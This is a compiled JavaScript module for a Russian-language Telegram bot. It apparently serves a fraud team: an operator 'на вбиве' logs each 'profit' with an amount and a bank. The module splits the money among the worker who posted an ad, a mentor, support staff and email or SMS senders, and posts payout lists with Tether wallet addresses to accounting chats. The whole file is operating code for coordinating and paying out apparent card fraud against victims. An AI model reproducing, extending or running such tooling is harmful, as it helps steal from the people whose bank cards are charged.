"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.checkProStatus = exports.setProfitScene = exports.composer = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const database_1 = require("../../database");
const config_1 = require("../../utils/config");
const profit_1 = require("../../database/models/profit");
const getUsername_1 = require("../../helpers/getUsername");
const percentageDistributor_1 = require("../../helpers/percentageDistributor");
const stickerList_1 = require("../../utils/stickerList");
const getFlagEmoji_1 = require("../../helpers/getFlagEmoji");
const console_1 = __importDefault(require("console"));
exports.composer = new grammy_1.Composer();
const regex = /log\s+profit\s+(?<id>\d+)/gmi;
exports.composer.callbackQuery(regex, async (ctx) => {
    await ctx.scenes.enter('log-profit');
});
exports.setProfitScene = new grammy_scenes_1.Scene('log-profit');
async function cancel(ctx) {
    await deleteAllMessages(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
}
exports.setProfitScene.always().callbackQuery('cancel log-profit', cancel);
// setProfitScene.do(async (ctx) => {
//     const match = regex.exec(ctx.match[0])
//     const id = match.groups.id
//
//     const keyboard = new InlineKeyboard()
//
//     for (const i in serviceList) {
//         const service = serviceList[i]
//         if (i === '3' || i === '6' || i === '9') {
//             keyboard.row()
//         }
//         keyboard.text(`${service.name.toUpperCase()}`, `profit set ${service.name}`)
//     }
//
//     keyboard.row()
//     keyboard.text(`Отмена`, `cancel log-profit`)
//
//     const res = await ctx.reply(`Выбери сервис:`, {
//         reply_markup: keyboard
//     })
//
//     ctx.session.deleteMessage = [res.message_id]
//     ctx.session.logId = Number(id)
//
//
// })
// setProfitScene.wait().callbackQuery(/profit set (?<service>\w+)/gmi, async ctx => {
//     const match = /profit set (?<service>\w+)/gmi.exec(ctx.callbackQuery.data)
//
//     const keyboard = new InlineKeyboard()
//     const service = getService(match.groups.service)
//
//     for (const i in service.country) {
//         const countryCode = service.country[i]
//         if (i === '2' || i === '4' || i === '6') { keyboard.row() }
//         keyboard.text(`${getFlagEmoji(countryCode)} ${getCountryByCountryCode(countryCode)}`,`profit set ${service.name}-${countryCode}`)
//     }
//     keyboard.row()
//     keyboard.text(`Отмена`, `cancel log-profit`)
//
//     await ctx.editMessageText(`Выбери страну для <b>${service.name.toUpperCase()}</b>`, {
//         reply_markup: keyboard
//     })
//     ctx.scene.resume()
// })
const callbackIdFixBag = new Set();
exports.setProfitScene.do(async (ctx) => {
    console_1.default.log('start profit');
    ctx.session.deleteMessage = [];
    const match = regex.exec(ctx.match[0]);
    ctx.session.logId = Number(match.groups.id);
    await ctx.reply(`Введи суму снятия в USD`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Отмена", callback_data: `cancel log-profit` }],
            ]
        }
    });
    ctx.scene.resume();
});
exports.setProfitScene.wait().hears(/(^\d+)/gmi, async (ctx) => {
    ctx.session.amount = /(^\d+)/gmi.exec(ctx.msg.text)[1];
    ctx.session.deleteMessage.push(ctx.message.message_id);
    await ctx.reply(`Введи название банка`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Отмена", callback_data: `cancel log-profit` }],
            ]
        }
    });
    ctx.scene.resume();
});
exports.setProfitScene.wait().on('message:text', async (ctx) => {
    ctx.session.text = ctx.message.text;
    const log = await database_1.logsRepository.findOne({
        where: {
            id: ctx.session.logId
        },
        relations: ['ad', 'ad.acceptedLog', 'ad.author', 'ad.author.mentor', 'ad.author.mentor.user', 'ad.support']
    });
    const settings = await database_1.settingsRepository.findOne({
        where: {
            id: 1
        }
    });
    if (!log) {
        await ctx.reply('log undefined');
        return cancel(ctx);
    }
    let userFate = await (0, percentageDistributor_1.percentageDistributor)(Number(ctx.session.amount), (log.ad.author.isPro) ? settings.proPercent : settings.percent);
    let mentorFate = undefined;
    let supportFate = undefined;
    if (log.ad.author.mentor) {
        mentorFate = await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), log.ad?.author.mentor.percent);
        userFate -= mentorFate;
        console_1.default.log(mentorFate, userFate);
    }
    if (log.ad.support) {
        supportFate = await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), settings.supportPercent);
        userFate -= supportFate;
        console_1.default.log(supportFate, userFate);
    }
    let smsEmailPercent = undefined;
    if (log.email || log.sms) {
        if (log.emailOwner === 'anafema' || log.emailOwner === 'keshmail') {
            smsEmailPercent = await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), 7);
            userFate -= smsEmailPercent;
        }
        else {
            smsEmailPercent = await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), 5);
            userFate -= smsEmailPercent;
        }
    }
    const res = await ctx.reply(`
🙊 Площадка: ${(0, getFlagEmoji_1.getFlagEmoji)(log.ad.country)} <b>${log.ad.service.toUpperCase()}</b>
🏦 Банк: ${ctx.session.text}
👷🏿‍♂️ Завел: ${await (0, getUsername_1.getUsername)(log.ad?.author)}
🚥 Процент: ${(log.ad.author.isPro) ? settings.proPercent : settings.percent}%
➖➖➖➖➖➖➖     
<b>🤑 Сумма:</b> ${ctx.session.amount} USD
<b>🤩 Твоя доля:</b> ${userFate} USD\n<b>${(log.email) ? '\nEMAIL: +' : (log.sms) ? '\nSMS: +' : ''}</b>${(mentorFate !== undefined) ? "\n<b>Наставник:</b> " + await (0, getUsername_1.getUsername)(log.ad?.author.mentor.user) + " 💻 " + mentorFate + " USD" : ''}${(supportFate !== undefined) ? "\n<b>ТП:</b> " + await (0, getUsername_1.getUsername)(log.ad?.support) : ''}
<b>На вбиве:</b> ${await (0, getUsername_1.getUsername)(ctx.user)} 🌚
    `, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Готово", callback_data: `profit success` }],
                [{ text: "Отмена", callback_data: `cancel log-profit` }],
            ]
        }
    });
    await deleteAllMessages(ctx.session.deleteMessage, ctx);
    ctx.session.deleteMessage.push(res.message_id);
    ctx.scene.resume();
});
exports.setProfitScene.wait().callbackQuery(/profit success/gmi, async (ctx) => {
    const checker = String(ctx.from.id) + String(ctx.callbackQuery.message.message_id);
    if (callbackIdFixBag.has(checker))
        return null;
    callbackIdFixBag.add(checker);
    const log = await database_1.logsRepository.findOne({
        where: {
            id: ctx.session.logId
        },
        relations: ['ad', 'ad.acceptedLog', 'ad.author', 'ad.author.mentor', 'ad.author.mentor.user', 'ad.support', 'ad.support']
    });
    const settings = await database_1.settingsRepository.findOne({
        where: {
            id: 1
        }
    });
    let userFate = await (0, percentageDistributor_1.percentageDistributor)(Number(ctx.session.amount), (log.ad.author.isPro) ? settings.proPercent : settings.percent);
    let mentorFate = undefined;
    let supportFate = undefined;
    if (log.ad.author.mentor) {
        mentorFate = await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), log.ad?.author.mentor.percent);
        userFate -= mentorFate;
    }
    if (log.ad.support) {
        supportFate = await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), settings.supportPercent);
        userFate -= supportFate;
    }
    let smsEmailPercent = undefined;
    if (log.email || log.sms) {
        if (log.emailOwner === 'anafema' || log.emailOwner === 'keshmail') {
            smsEmailPercent = await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), 7);
            userFate -= smsEmailPercent;
        }
        else {
            smsEmailPercent = await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), 5);
            userFate -= smsEmailPercent;
        }
    }
    log.ad.profits += 1;
    await ctx.api.sendSticker(log.ad.author.tgId, (Number(ctx.session.amount) > 999) ? stickerList_1.stickerList.successSuccessful : stickerList_1.stickerList.aOnMoget);
    await ctx.api.sendMessage(log.ad.author.tgId, `
✅ Успех успешный!
${(0, getFlagEmoji_1.getFlagEmoji)(log.ad.country)} <b>${log.ad.service.toUpperCase()}</b>
🏦 Банк: ${ctx.session.text}
➖➖➖➖➖➖➖
<b>Сумма:</b> ${ctx.session.amount} USD
<b>Твоя доля:</b> ${userFate} USD\n${(mentorFate !== undefined) ? "\n<b>Наставник:</b> " + await (0, getUsername_1.getUsername)(log.ad?.author.mentor.user) + " 🌿 " + mentorFate + " USD" : ''}${(supportFate !== undefined) ? "\n<b>ТП:</b> " + await (0, getUsername_1.getUsername)(log.ad?.support) + " 🌿 " + supportFate + " USD" : ''}
<b>Вбивал:</b> ${await (0, getUsername_1.getUsername)(ctx.user)} 💳
        `);
    const text = `
🙊 Площадка: ${(0, getFlagEmoji_1.getFlagEmoji)(log.ad.country)} <b>${log.ad.service.toUpperCase()}</b>
🏦 Банк: ${ctx.session.text}
👷🏿‍♂️ Завел: ${await (0, getUsername_1.getUsername)(log.ad?.author)}
🚥 Процент: ${(log.ad.author.isPro) ? settings.proPercent : settings.percent}%
➖➖➖➖➖➖➖
<b>🤑 Сумма:</b> ${ctx.session.amount} USD
<b>🤩 Твоя доля:</b> ${userFate} USD\n<b>${(log.email) ? '\nEMAIL: +' : (log.sms) ? '\nSMS: +' : ''}</b>${(mentorFate !== undefined) ? "\n<b>Наставник:</b> " + await (0, getUsername_1.getUsername)(log.ad?.author.mentor.user) + " 💻 " + mentorFate + " USD" : ''}${(supportFate !== undefined) ? "\n<b>ТП:</b> " + await (0, getUsername_1.getUsername)(log.ad?.support) : ''}
<b>На вбиве:</b> ${await (0, getUsername_1.getUsername)(ctx.user)} 🌚
    `;
    const payment = await ctx.api.sendMessage(config_1.config.chats.payments, text, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "⌚ Выплачивается ⌚️", callback_data: `oaooaoaaoaoa` }]
            ]
        }
    });
    const profit = new profit_1.Profit();
    profit.value = Number(ctx.session.amount);
    profit.worker = log.ad.author;
    profit.workerValue = userFate;
    if (log.ad.author.mentor) {
        profit.mentorValue = mentorFate;
        profit.mentor = log.ad.author.mentor;
    }
    if (log.ad.support) {
        profit.supportValue = supportFate;
        profit.support = log.ad.support;
    }
    profit.vbiver = ctx.user;
    profit.msgId = payment.message_id;
    let text2 = `
${(0, getFlagEmoji_1.getFlagEmoji)(log.ad.country)} <b>${log.ad.service.toUpperCase()}</b>
🐨 <b>Воркер:</b> ${await (0, getUsername_1.getUsername)(log.ad.author, true, true)}
🌱 <b>ID объявления:</b> <code>${log.ad.date}</code>

🌳 <b>Вписано:</b> ${await (0, getUsername_1.getUsername)(ctx.user, true, true)} 🌿 ${profit.value} USD
🏦 <b>Банк:</b> ${ctx.session.text}

🐨 <b>Воркер:</b> ${await (0, getUsername_1.getUsername)(log.ad.author, true, true)} 🌿 ${userFate} USD
🌳 <b>Tether (TRC-20):</b> <code>${log.ad.author.trcAddress}</code>
    `;
    if (mentorFate) {
        text2 += `➖➖➖➖➖➖➖`;
        text2 += `\n🐨 <b>Наставник:</b> (${await (0, getUsername_1.getUsername)(log.ad.author.mentor.user, true, true)}) 🌿 ${profit.mentorValue} USD`;
        text2 += `\n🌳 <b>Tether (TRC-20):</b> <code>${log.ad.author.mentor.user.trcAddress}</code>`;
    }
    if (supportFate) {
        text2 += `➖➖➖➖➖➖➖`;
        text2 += `\n🐨 <b>ТП</b> (${await (0, getUsername_1.getUsername)(log.ad.support)}) 🌿 ${profit.supportValue} USD`;
        text2 += `\n🌳 <b>Tether (TRC-20):</b> <code>${log.ad.support.trcAddress}</code>`;
    }
    if (log.email) {
        text2 += `\n➖➖➖➖➖➖➖`;
        text2 += `\n💌 <b>Отправитель: EMAIL 🌿 ${smsEmailPercent} USD | ${log.emailOwner}</b>`;
    }
    else if (log.sms) {
        text2 += `\n➖➖➖➖➖➖➖`;
        text2 += `\n📲 <b>Отправитель: SMS 🌿 ${await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), 5)} USD | ${log.sms}</b>`;
    }
    await database_1.profitRepository.save(profit);
    await ctx.api.sendMessage(config_1.config.chats.accounting, text2, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "♻️ Не выплатил", callback_data: `admin set paid true ${profit.id}` }]
            ]
        }
    });
    await ctx.api.sendSticker(config_1.config.chats.chat, (Number(ctx.session.amount) > 999) ? stickerList_1.stickerList.successSuccessful : stickerList_1.stickerList.aOnMoget);
    await ctx.copyMessage(config_1.config.chats.chat);
    await ctx.deleteMessage();
    await database_1.logsRepository.save(log);
    await ctx.reply('Профит успешно вписан', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "Закрыть", callback_data: `deleteThisMessage` }],
            ]
        }
    });
    log.ad.author.lastProfit = profit;
    await database_1.userRepository.save(log.ad.author);
    if (log.ad.author.mentor) {
        await checkWorkerFreedom(log.ad.author, ctx).then();
    }
    if (!log.ad.author.isPro) {
        await checkProStatus(ctx, log.ad.author, settings);
    }
    try {
        if (log.emailOwner === 'yourmailer') {
            await ctx.api.sendMessage(-852647521, `
💗 УСПЕХ - ${log.ad.service.toUpperCase()} ${await (0, getFlagEmoji_1.getFlagEmoji)(log.ad.country)}
💸 Сумма: ${userFate} USD
📩 Выплата Mail (5%) ${await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), 5)} USD
🧸 Воркер: ${await (0, getUsername_1.getUsername)(log.ad.author, true, true)}
        `);
        }
        else if (log.emailOwner === 'phs') {
            await ctx.api.sendMessage(-4047150661, `
💗 УСПЕХ - ${log.ad.service.toUpperCase()} ${await (0, getFlagEmoji_1.getFlagEmoji)(log.ad.country)}
💸 Сумма: ${userFate} USD
📩 Выплата Mail (5%) ${await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), 5)} USD
🧸 Воркер: ${await (0, getUsername_1.getUsername)(log.ad.author, true, true)}
        `);
        }
        else if (log.emailOwner === 'gosu') {
            await ctx.api.sendMessage(-4073806103, `
💗 УСПЕХ - ${log.ad.service.toUpperCase()} ${await (0, getFlagEmoji_1.getFlagEmoji)(log.ad.country)}
💸 Сумма: ${userFate} USD
📩 Выплата Mail (5%) ${await (0, percentageDistributor_1.percentageDistributor)(Number(userFate), 5)} USD
🧸 Воркер: ${await (0, getUsername_1.getUsername)(log.ad.author, true, true)}
        `);
        }
    }
    catch (e) { }
    ctx.scene.exit();
});
async function checkProStatus(ctx, user, settings) {
    const profits = await database_1.profitRepository.find({
        relations: { worker: true },
        where: {
            worker: {
                tgId: user.tgId
            }
        }
    });
    let number = 0;
    for (const profit of profits) {
        if (new Date(profit.created_at).getTime() > 1687002212916) {
            number++;
        }
    }
}
exports.checkProStatus = checkProStatus;
async function checkWorkerFreedom(worker, ctx) {
    const profits = await database_1.profitRepository.find({
        relations: { mentor: true, worker: true },
        where: {
            mentor: worker.mentor,
            worker: {
                tgId: worker.tgId
            }
        }
    });
    if (profits.length >= worker.mentor.freedom) {
        worker.mentor = null;
        await database_1.userRepository.save(worker);
        await ctx.api.sendMessage(worker.tgId, `
Ты сделал достаточное кол-во профитов: <code>${profits.length}</code>
Теперь ты свободен!`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Закрыть", callback_data: `deleteThisMessage` }]
                ]
            }
        }).catch(console_1.default.log);
        await ctx.api.sendMessage(worker.tgId, `
${await (0, getUsername_1.getUsername)(worker, true, true)} сделал с тобой профитов: <code>${profits.length}</code>
Увы, но теперь он не твой ученик
    `, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Закрыть", callback_data: `deleteThisMessage` }]
                ]
            }
        }).catch(console_1.default.log);
        return null;
    }
}
async function deleteAllMessages(array, ctx) {
    for (const id of array) {
        try {
            await ctx.api.deleteMessage(ctx.chat.id, id).catch();
        }
        catch (e) {
            console_1.default.log(e);
        }
    }
}
